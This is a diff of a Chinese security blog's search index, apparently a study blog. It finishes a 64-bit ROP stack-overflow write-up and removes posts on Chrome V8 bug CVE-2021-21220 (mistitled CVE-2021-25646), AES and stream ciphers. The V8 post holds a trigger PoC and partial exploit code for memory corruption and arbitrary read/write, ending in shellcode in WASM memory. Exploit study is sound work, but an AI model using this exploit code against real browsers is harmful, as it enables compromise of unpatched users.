+<h5 id="查看”-bin-sh”地址"><a href="#查看”-bin-sh”地址" class="headerlink" title="查看”/bin/sh”地址"></a>查看”/bin/sh”地址</h5><p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211002024828003.png" alt="image-20211002024828003"></p>
+<p>binsh_addr=0x7ffff7b95e1a</p>
+<h5 id="修改pwn脚本并执行"><a href="#修改pwn脚本并执行" class="headerlink" title="修改pwn脚本并执行"></a>修改pwn脚本并执行</h5><p>需要注意的是64位情况下,offeset发生了变化=0x80(数组偏移)+0x8(ebp填充)</p>
+<p>当我们所有工作都做完之后发现并不能正常GetShell。。</p>
+<h5 id="RSP-16bytes-Alig-and-wirte-our-own-code"><a href="#RSP-16bytes-Alig-and-wirte-our-own-code" class="headerlink" title="==RSP 16bytes Alig and wirte our own code=="></a>==RSP 16bytes Alig and wirte our own code==</h5><ul>
+<li>Step 1 : 起初是以为是offset 或者system地址什么的算错了，再重复N次都计算得到同一结果时，排除此问题。</li>
+<li>Step 2: Search On Google 初步确定问题为 64位程序在call函数前要求RSP16 bytes对齐，带入本题具体情境：利用gadget获取rdi并将system函数调用参数”/bin/sh”入栈,然后执行system函数，问题出在call system时rsp不是16的倍数。</li>
+<li>Step 3: 问题溯源</li>
+</ul>
+<p>下载本函数使用的库函数，定位system函数调用前操作，使用IDA静态调试</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211007001227724.png" alt="image-20211007001227724" style="zoom:67%;" /></p>
+<p>关键处Movaps指令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movaps  XMM,XMM&#x2F;m128 </span><br><span class="line">movaps  XMM&#x2F;m128,XMM</span><br><span class="line">把源存储器内容值送入目的寄存器,当有m128时, 内存地址必须是16字节对齐的。</span><br><span class="line">XMMWORD旨在表示与m128相同的类型,刚好这里符合第二条。</span><br></pre></td></tr></table></figure>
+<p>问题已经十分清晰，下面我们用GDB实际调试以下确认是否确实是由RSP没对齐导致的System不能执行。</p>
+<ul>
+<li>Step 3: gdb问题验证</li>
+</ul>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211007001531367.png" alt="image-20211007001531367" style="zoom:50%;" /></p>
+<p>调试转储文件core确认确实是rsp未对齐所致</p>
+<ul>
+<li>Step 4: Sove RSP Align Problems</li>
+</ul>
+<p>起初没有多想以为单纯增加payload长度(即 末尾增加8个b’a’)，修改后却发现依旧报错！</p>
+<p>👆上面问题主要出在对栈帧结构理解并不透彻，RSP是随着执行汇编指令而变化的！而payload多溢出的8个bytes对RSP不会有任何影响，通过gdb调试也验证了RSP依旧不变</p>
+<p>简单Google后发现解决办法,gadget一个return指令即可,然后在调用System 函数之前 执行ret指令使得rsp增加8满足16bytes对齐要求。</p>
+<p>修改后代码如下</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211007002054915.png" alt="image-20211007002054915" style="zoom:67%;" /></p>
+<p>验证：</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211007002246666.png" alt="image-20211007002246666" style="zoom:67%;" /></p>
+<h3 id="4-My-Summary"><a href="#4-My-Summary" class="headerlink" title="4.My Summary"></a>4.My Summary</h3><ul>
+<li><p>工具方面：初步了解gdb工作原理，能使用gdb对程序进行调试和栈帧分析，掌握gcc编译开启相关保护，初步了解NX绕过。学会使用ROPgadgets、dmesg。</p>
+</li>
+<li><p>内容方面，了解PLT和GOT表的原理，掌握基本ROP栈溢出，对Pwntools底层实现原理有了初步了解，了解elf文件执行时的Env环境变量。</p>
+</li>
+<li>技能方面，通过手动调试、发现问题、实际解决”关于gdb调试中看到的buf数组首地址和调试core转储文件不一致的解释”、”64-bit程序下RSP指针对齐问题”，自主查阅资料和分析的能力得到锻炼提升(有问题就找Stackoverflow)。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>Pwn</tag>
+        <tag>Rop</tag>
       </tags>
   </entry>
   <entry>
@@ -1318,8 +1713,8 @@ Last Remainder chunk：对small bin的malloc机制的介绍中当用户请求的
         <category>Pwn</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>Pwn</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1829,8 +2224,8 @@ Last Remainder chunk：对small bin的malloc机制的介绍中当用户请求的
         <category>linux</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>linux</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -2698,225 +3093,6 @@ Last Remainder chunk：对small bin的malloc机制的介绍中当用户请求的
       <tags>
         <tag>linux</tag>
         <tag>ELF文件</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2021-25646堆溢出漏洞复现及分析</title>
-    <url>/2021/05/08/CVE-2021-21220/</url>
-    <content><![CDATA[<h1 id="CVE-2021-21220在野0day"><a href="#CVE-2021-21220在野0day" class="headerlink" title="CVE-2021-21220在野0day"></a>CVE-2021-21220在野0day</h1><h5 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h5><p>Google chrome 90.0.4430.72之前版本中存在安全漏洞，该漏洞源于V8优化中的数据验证不足。                 </p>
-<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>chrome&lt; 90.0.4430.72以及Microsoft Edge和其他可能基于Chromium的浏览器。</p>
-<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="下载exp并利用"><a href="#下载exp并利用" class="headerlink" title="下载exp并利用"></a>下载exp并利用</h5><p><img src="https://i.loli.net/2021/05/08/DSlBGEj7zLPiK3a.png" alt="exp.jpg"></p>
-<p>打开包含该漏洞的html页面，成功弹出计算器，执行恶意代码。</p>
-<h4 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h4><h5 id="what’s-V8"><a href="#what’s-V8" class="headerlink" title="what’s V8"></a>what’s V8</h5><p>V8是Chromium内核中的JavaScript引擎，负责对JavaScript代码进行解释优化与执行，而CVE-2020-16040(crbug.com/1150649)是V8优化编译器Turbofan在SimplifiedLowering阶段产生的一个整数溢出漏洞。</p>
-<h5 id="V8引擎工作流程"><a href="#V8引擎工作流程" class="headerlink" title="V8引擎工作流程"></a>V8引擎工作流程</h5><p><img src="https://i.loli.net/2021/05/08/uX2F8e39DnUAYIJ.png" alt="V8.png"></p>
-<h5 id="Parser-解析器-："><a href="#Parser-解析器-：" class="headerlink" title="Parser(解析器)："></a><strong>Parser(解析器)：</strong></h5><p>负责通过对源代码进行词法分析得到的token对源代码进行语法错误分析、转换为AST抽象语法树并确定词法作用域：</p>
-<p>Demo:</p>
-<p><img src="https://i.loli.net/2021/05/08/mc7hrtTZsnzPMCD.png" alt="pz.jpg"></p>
-<p><strong>Ignition(解释器)</strong>：负责将 AST 转换为中间代码即字节码(Bytecode)并逐行解释执行字节码，在该阶段， JavaScript 代码就已经开始执行了。</p>
-<p>考虑如下代码bytecode.js：</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ziwu_add = <span class="function">(<span class="params">x,y</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line">ziwu_add(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-<p>使用命令./d8 bytecode.js —allow-natives-syntax —print-bytecode —print-bytecode-filter ziwu_add可得到其字节码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[generated bytecode for function: ziwu_add (0x1984082d26e1 &lt;SharedFunctionInfo ziwu_add&gt;)]</span><br><span class="line">Parameter count 3</span><br><span class="line">Register count 0</span><br><span class="line">Frame size 0</span><br><span class="line">0x1984082d2826 @    0 : 25 04             Ldar a1</span><br><span class="line">0x1984082d2828 @    2 : 35 03 00          Add a0, [0]</span><br><span class="line">0x1984082d282b @    5 : ab                Return </span><br><span class="line">Constant pool (size &#x3D; 0)</span><br><span class="line">Handler Table (size &#x3D; 0)</span><br><span class="line">Source Position Table (size &#x3D; 0)</span><br></pre></td></tr></table></figure>
-<p>Add a0, [0]即字节码，他告诉V8我们是要执行一个加法操作。</p>
-<h5 id="TurboFan-优化编译器"><a href="#TurboFan-优化编译器" class="headerlink" title="TurboFan(优化编译器)"></a><strong>TurboFan(优化编译器)</strong></h5><p>负责将字节码和一些分析数据作为输入并生成优化的机器代码，当 Ignition 将 JavaScript 代码转换为字节码后，代码开始执行，V8 会一直观察 JavaScript  代码的执行情况，并记录执行信息，如每个函数的执行次数、每次调用函数时，传递的参数类型等。<strong>如果一个函数被调用的次数超过了内设的阈值，监视器就会将当前函数标记为热点函数（Hot Function）</strong>，并将该函数的字节码以及执行的相关信息发送给 TurboFan。TurboFan  会根据执行信息做出一些进一步优化此代码的假设，在假设的基础上将字节码编译为优化的机器代码。如果假设成立，那么当下一次调用该函数时，就会执行优化编译后的机器代码，以提高代码的执行性能。当某一次调用传入的信息变化时，表示 TurboFan 的假设是错误的，此时优化编译生成的机器代码就不能再使用了，于是进行优化回退，重走原复杂函数逻辑。</p>
-<p><img src="https://i.loli.net/2021/05/08/542paODGEb1NAsl.png" alt="1.png"></p>
-<p>优化Demo:</p>
-<p>优化逻辑过程如下，考虑下述代码：</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ziwu_add = <span class="function">(<span class="params">x,y</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line">ziwu_add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">ziwu_add(<span class="string">&#x27;hack&#x27;</span>,<span class="string">&#x27;you&#x27;</span>);</span><br><span class="line">ziwu_add([],&#123;&#125;)</span><br></pre></td></tr></table></figure>
-<p>V8在每次计算时需要先判断x、y的类型，然后执行相应的处理，但如果该函数要执行很多次呢？</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ziwu_add = <span class="function">(<span class="params">x,y</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++)&#123;</span><br><span class="line">  ziwu_add(<span class="number">1</span>+i,<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>x参数持续变化，如果每次都要去判断类型是否过于繁琐，不够高效，Turbofan通过观察发现，经过了如此多的循环计算，x、y参数都是int类型，有理由相信下一次应该还是这样，那就不妨将x、y参数的类型假设为int，基于这个假设，我们可以将ziwu_add函数优化为简单的加法：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add eax ebx;</span><br></pre></td></tr></table></figure>
-<h5 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h5><p>根据补丁发生变化的位置分析：</p>
-<p>漏洞存在于 Chrome 的 JS 引擎的 JIT 编译器 Turbofan 当中，Instruction Selector阶段在处理ChangeInt32ToInt64节点时，会先检查 node 的 input 节点，如果 input 节点的操作码是 Load，那么会根据该 input节点的 LoadRepresentation 和 MachineRepresentation进行一些特殊的处理，如果判断该 input 节点的 MachineRepresentation 的类型是kWord32, 那么会根据 LoadRepresentation 是有符号的还是无符号的选择对应的指令，如果是有符号的选择X64Movsxlq，在x86指令集中是有符号扩展，如果是无符号的选择X64Movl， 在x86指令集中是无符号扩展。</p>
-<p><strong>漏洞的根源是V8 对ChangeInt32ToInt64的假设是该节点的输入必定被解释为一个有符号的Int32的值，所以无论 LoadRepresentation如何，都应该使用X64Movsxlq指令。</strong></p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> InstructionSelector::<span class="function"><span class="title">VisitChangeInt32ToInt64</span>(<span class="params">Node* node</span>)</span> &#123;</span><br><span class="line">    DCHECK_EQ(node-&gt;InputCount(), <span class="number">1</span>);</span><br><span class="line">    Node* input = node-&gt;InputAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (input-&gt;opcode() == IrOpcode::kTruncateInt64ToInt32) &#123;</span><br><span class="line">        node-&gt;ReplaceInput(<span class="number">0</span>, input-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    X64OperandGenerator g(<span class="built_in">this</span>);</span><br><span class="line">    Node* <span class="keyword">const</span> value = node-&gt;InputAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (value-&gt;opcode() == IrOpcode::kLoad &amp;&amp; CanCover(node, value)) &#123;</span><br><span class="line">        LoadRepresentation load_rep = LoadRepresentationOf(value-&gt;op());</span><br><span class="line">        MachineRepresentation rep = load_rep.representation();</span><br><span class="line">        InstructionCode opcode;</span><br><span class="line">        <span class="keyword">switch</span> (rep) &#123;</span><br><span class="line">        <span class="keyword">case</span> MachineRepresentation::kBit:<span class="comment">// Fall through.</span></span><br><span class="line">        <span class="keyword">case</span> MachineRepresentation::kWord8:</span><br><span class="line">            opcode = load_rep.IsSigned() ? kX64Movsxbq : kX64Movzxbq;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MachineRepresentation::kWord16:</span><br><span class="line">            opcode = load_rep.IsSigned() ? kX64Movsxwq : kX64Movzxwq;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MachineRepresentation::kWord32:</span><br><span class="line">            opcode = load_rep.IsSigned() ? kX64Movsxlq : kX64Movl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            UNREACHABLE();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>触发漏洞POC</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span> ** <span class="number">31</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> (arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo()); <span class="comment">//这一行输出-2147483647</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">foo();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;after optimization&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(foo());<span class="comment">//这一行输出2147483649</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>同样一个函数在优化前和优化后返回的结果不一致。在优化前，arr[0] ^ 0的结果用十六进制表示是0x80000000， 对于异或运算，JS 引擎会将结果看做一个有符号的 Int32 的值，所以异或的结果是-2147483648, 加上1 以后变成-2147483647。</p>
-<p>但是为什么优化后的结果不一致了呢，我们可以观察程序运行过程中生成的 Turbofan 的图。arr[0] ^ 0这个表达式被优化成了一个Load节点， 对应下图中的 #81 节点，而(arr[0] ^0) + 1这个加法运算被优化成了#58 ChangeInt32ToInt64节点和#50 Int64Add节点，如下图中黄色高亮部分所示，在图中可以看到，Load 节点的 MachineRepresentation 是Word32，而LoadRepresentation的类型是Uint32， 故而 Turbofan 选择了movl指令，也就是无符号扩展指令，导致 Load 节点的值会被无符号扩展为 64 位，然后和 1 相加，最后结果自然是2147483649。</p>
-<p><img src="https://i.loli.net/2021/05/08/ENX8fQpMLbOqrjK.png" alt="5.jpg"></p>
-<p><img src="https://i.loli.net/2021/05/08/oWfOR7UkB2pcCPy.png" alt="2.png"></p>
-<p>用调试器调试也可以验证，在执行到mov ecx, DWORD PTR [rcx] 这一行时，rcx寄存器指向的值为0x80000000, 无符号扩展变成了2147483648， 最后加上 1 变成了2147483649。</p>
-<p><img src="https://i.loli.net/2021/05/08/3ItTaVXbodYwic2.png" alt="3.jpg"></p>
-<h5 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">constructor</span>(<span class="params">size</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(size);</span><br><span class="line">            <span class="built_in">this</span>.slot = <span class="number">0xb33f</span>;<span class="comment">//进行地址泄露</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> x = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (a) x = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">Math</span>.sign(<span class="number">0</span> - <span class="built_in">Math</span>.max(<span class="number">0</span>, x, -<span class="number">1</span>)));<span class="comment">//构造长度为-1的数组</span></span><br><span class="line">        arr.shift();</span><br><span class="line">        <span class="keyword">let</span> local_arr = <span class="built_in">Array</span>(<span class="number">2</span>);</span><br><span class="line">        local_arr[<span class="number">0</span>] = <span class="number">5.1</span>;<span class="comment">//4014666666666666</span></span><br><span class="line">        <span class="keyword">let</span> buff = <span class="keyword">new</span> LeakArrayBuffer(<span class="number">0x1000</span>);<span class="comment">//</span></span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">0x1122</span>;<span class="comment">//修改数组长度</span></span><br><span class="line">        <span class="keyword">return</span> [arr, local_arr, buff];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i)</span><br><span class="line">        foo(<span class="literal">false</span>);</span><br><span class="line">    gc(); gc();</span><br><span class="line">    [corrput_arr, rwarr, corrupt_buff] = foo(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
-<p>通过代码Array(Math.sign(0 – Math.max(0, x, -1)))创建一个length为-1的数组，然后使用LeakArrayBuffer构造内存布局，将相对读写布局成绝对读写。</p>
-<p><img src="https://i.loli.net/2021/05/08/jQmvCbi89npDrFP.png" alt="4.png"></p>
-<p>这里需要说明的是，由于chrome80以上版本启用了地址压缩，地址高4个字节，可以在构造的array后面的固定偏移找到。</p>
-<p>先将corrupt_buffer的地址泄露，然后如下计算地址</p>
-<blockquote>
-<p>(corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;</p>
-</blockquote>
-<p>可以计算出高4字节。</p>
-<p>同时结合0x02步骤中实现的相对读写和对象泄露，可实现绝对地址读写。@r4j0x00在issue 1196683中构造length为-1数组后，则通过伪造对象实现任意地址读写。</p>
-<p>之后，由于WASM内存具有RWX权限，因此可以将shellcode拷贝到WASM所在内存，实现任意代码执行。</p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>堆溢出</tag>
-        <tag>CVE-2021-21220</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AES分析</title>
-    <url>/2021/05/17/cryp_AES/</url>
-    <content><![CDATA[<h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>Advanced Encryption Standard（AES），高级加密标准，是典型的块加密，被设计来取代 DES，由 Joan Daemen 和 Vincent Rijmen 所设计。其基本信息如下</p>
-<ul>
-<li>输入：128 比特。</li>
-<li>输出：128 比特。</li>
-<li>SPN 网络结构。</li>
-<li>过程主要包括<strong>字节替代</strong>、<strong>行移位</strong>、<strong>列混淆</strong>和<strong>轮密钥加</strong></li>
-</ul>
-<p>其迭代轮数与密钥长度有关系，如下</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>密钥长度（比特）</th>
-<th>迭代轮数</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>128</td>
-<td>10</td>
-</tr>
-<tr>
-<td>192</td>
-<td>12</td>
-</tr>
-<tr>
-<td>256</td>
-<td>14</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在 AES 加解密过程中，每一块都是 128 比特，所以我们这里明确一些基本概念。</p>
-<p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_data_unit.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_data_unit.png" alt="img"></a></p>
-<p>在 AES 中，块与 State 之间的转换过程如下</p>
-<p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_block2state.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_block2state.png" alt="img"></a></p>
-<p>所以，可以看出，每一个 block 中的字节是按照列排列进入到状态数组的。</p>
-<p>而对于明文来说，一般我们会选择使用其十六进制进行编码。</p>
-<p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_plain2state.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_plain2state.png" alt="img"></a></p>
-<h3 id="加解密过程"><a href="#加解密过程" class="headerlink" title="加解密过程"></a>加解密过程</h3><p>这里给个看雪上比较好的 <a href="http://bbs.pediy.com/thread-90722.htm">图例</a> ，以便于介绍基本的流程，每一轮主要包括</p>
-<ul>
-<li>轮密钥加，AddRoundKey</li>
-<li>字节替换，SubBytes</li>
-<li>行移位，ShiftRows</li>
-<li>列混淆，MixColumns</li>
-</ul>
-<p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_details.jpg"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_details.jpg" alt="img"></a></p>
-<p>上面的列混淆的矩阵乘法等号左边的列向量应该在右边。</p>
-<p>这里再给一张其加解密的全图，其解密算法的正确性很显然。</p>
-<p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_enc_dec.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_enc_dec.png" alt="img"></a></p>
-<p>我们这里重点关注一下以下。</p>
-<h4 id="字节替换"><a href="#字节替换" class="headerlink" title="字节替换"></a>字节替换</h4><p>在字节替换的背后，其实是有对应的数学规则来定义对应的替换表的，如下</p>
-<p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_subbytes.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_subbytes.png" alt="img"></a></p>
-<script type="math/tex; mode=display">
-这里的运算均定义GF(2^8)内</script><h4 id="列混淆"><a href="#列混淆" class="headerlink" title="列混淆"></a>列混淆</h4><script type="math/tex; mode=display">
-这里的运算也是定义在 GF(2^8) 上，使用的模多项式为 x^8+x^4+x^3+1。</script><h4 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h4><p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_key_expansion.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_key_expansion.png" alt="img"></a></p>
-<h2 id="等价解密算法"><a href="#等价解密算法" class="headerlink" title="等价解密算法"></a>等价解密算法</h2><p>简单分析一下，我们可以发现</p>
-<ul>
-<li>交换逆向行移位和逆向字节代替并不影响结果。</li>
-<li>交换轮密钥加和逆向列混淆并不影响结果，关键在于<ul>
-<li>首先可以把异或看成域上的多项式加法</li>
-<li>然后多项式中乘法对加法具有分配率。</li>
-</ul>
-</li>
-</ul>
-<h2 id="GF-2-8-上的四则运算"><a href="#GF-2-8-上的四则运算" class="headerlink" title="GF(2^8)上的四则运算"></a>GF(2^8)上的四则运算</h2><p>加减法：</p>
-<script type="math/tex; mode=display">
-在GF(2^8)上的加法定义为二进制多项式加法，且其系数模2</script><p>Demo:  57+83=D4</p>
-<script type="math/tex; mode=display">
-(x^6+x^4+x^2+x+1)+(x^7+x+1)=x^7+x^6+ x^4+ x^2 (mod m(x))</script><p>乘除法：</p>
-<script type="math/tex; mode=display">
-在GF(2^8)中定义的二进制乘积模一个次数为8的不可约多项式</script><script type="math/tex; mode=display">
-m(x)= x^8+x^4+x^3+x+1</script><p>Demo: 57*83=C1</p>
-<script type="math/tex; mode=display">
- (x^6+x^4+x^2+x+1)·(x^7+x+1)=x^7+x^6+1(mod m(x))</script><p>列混合：</p>
-<p>列混合操作等价于以下矩阵乘法：</p>
-<p><img src="https://i.loli.net/2021/05/17/9h4RbYwG7LoDTvF.png" alt="AES.png"></p>
-<script type="math/tex; mode=display">
-b3​x3+b2​x2+b1​x+b0​=(a3​x3+a2​x2+a1​x+a0​)({03}x3+{01}x2+{01}x+{02})</script><script type="math/tex; mode=display">
-=(a3​∗03)x6+(a3​∗01+a2​∗03)x5+(a3​∗01+a2​∗01+a1​∗03)x4+(a3​∗02+a2​∗01+a1​∗01+a0​∗03)x3+(a2​∗02+a1​∗01+a0​∗01)x2+(a1​∗02+a0​∗01)x+a0​∗02</script><script type="math/tex; mode=display">
-=(a3​∗02+a2​∗01+a1​∗01+a0​∗03)x3+(a3​∗03+a2​∗02+a1​∗01+a0​∗01)x2+(a3​∗01+a2​∗03+a1​∗02+a0​∗01)x+(a3​∗01+a2​∗01+a1​∗03+a0​∗02)</script><p>最终写为矩阵形式即如上图</p>
-]]></content>
-      <categories>
-        <category>cryptography</category>
-      </categories>
-      <tags>
-        <tag>AES</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>流密码</title>
-    <url>/2021/05/17/cryp_%E6%B5%81%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<h2 id="流密码基本概念"><a href="#流密码基本概念" class="headerlink" title="流密码基本概念"></a>流密码基本概念</h2><p>流密码一般逐字节或者逐比特处理信息。</p>
-<p><strong>特点</strong>：</p>
-<ul>
-<li>流密码的密钥长度会与明文的长度相同。</li>
-<li>流密码的密钥派生自一个较短的密钥，派生算法通常为一个伪随机数生成算法。</li>
-</ul>
-<p><strong>类型</strong>：对称加密。</p>
-<p>伪随机数生成算法生成的序列的随机性越强，明文中的统计特征被覆盖的更好。</p>
-<p>流密码加解密非常简单，在已知明文的情况下，可以非常容易地获取密钥流。</p>
-<p>流密码的关键在于设计好的伪随机数生成器。一般来说，伪随机数生成器的基本构造模块为反馈移位寄存器。当然，也有一些特殊设计的流密码，比如 RC4。</p>
-<h2 id="基于LFSR的PRG"><a href="#基于LFSR的PRG" class="headerlink" title="基于LFSR的PRG"></a>基于LFSR的PRG</h2><h3 id="线性反馈移位寄存器LFSR"><a href="#线性反馈移位寄存器LFSR" class="headerlink" title="线性反馈移位寄存器LFSR"></a>线性反馈移位寄存器LFSR</h3><p>概念：线性反馈移位寄存器是指有n个寄存器（称为n-级移位寄存器）R1,R2,…,Rn从右到左排列，每个寄存器中能存放1位二进制数，所有寄存器中的数可以统一向右（或向左）移动1位，称为进动1拍. 即R1的值(b1)右移1位后输出，然后R2的值(b2)送R1 , R3的值(b3)送R2,……最后，Rn的值(bn)送Rn-1.</p>
-<p>LFSR运行基本操作：</p>
-<ol>
-<li><strong>初始化。</strong>首先，LFSR会以给定的种子（即密钥）初始化寄存器，以位（比特）为单位：</li>
-</ol>
-<p><img src="https://i.loli.net/2021/05/17/5aL9UrY7nJtO2Qh.png" alt="LFSR.png"></p>
-<p><strong>2. 抽头。</strong>随后，LFSR从这些比特位中随机选取一些（称作“抽头”），并计算这些抽头的异或：</p>
-<p><img src="https://i.loli.net/2021/05/17/QAHqkRF4IJdY96U.png" alt="LFSR1.png"></p>
-<p><strong>3. 位移并附加。</strong>最后，LFSR将这些抽头异或的结果附加到寄存器开头，并使寄存器向右位移，最后一个比特位作为结果输出：</p>
-<p><img src="https://i.loli.net/2021/05/17/tFKp7D2uXAvTUoQ.png" alt="LFSR2.png"></p>
-<p>初始化寄存器后，每个时钟周期LFSR将执行重复上边这些步骤，选取一些抽头，将它们异或，随后寄存器右移输出最右一位并将异或结果附加到寄存器开头。</p>
-<h3 id="Math-Analyse："><a href="#Math-Analyse：" class="headerlink" title="Math_Analyse："></a>Math_Analyse：</h3><p>线性反馈移位寄存器的反馈函数一般如下</p>
-<script type="math/tex; mode=display">
-a_{i+n}={\sum_{j=1}^{n}c_ja_{i+n-j}}</script><script type="math/tex; mode=display">
-其中，c_j 均在某个有限域 F_q 中。</script><p>既然线性空间是一个线性变换，我们可以得知这个线性变换为</p>
-<p><img src="https://i.loli.net/2021/05/17/OyARqfurLWCPw3l.png" alt="LFSR3.png"></p>
-<p>进而，我们可以求得其特征多项式为</p>
-<script type="math/tex; mode=display">
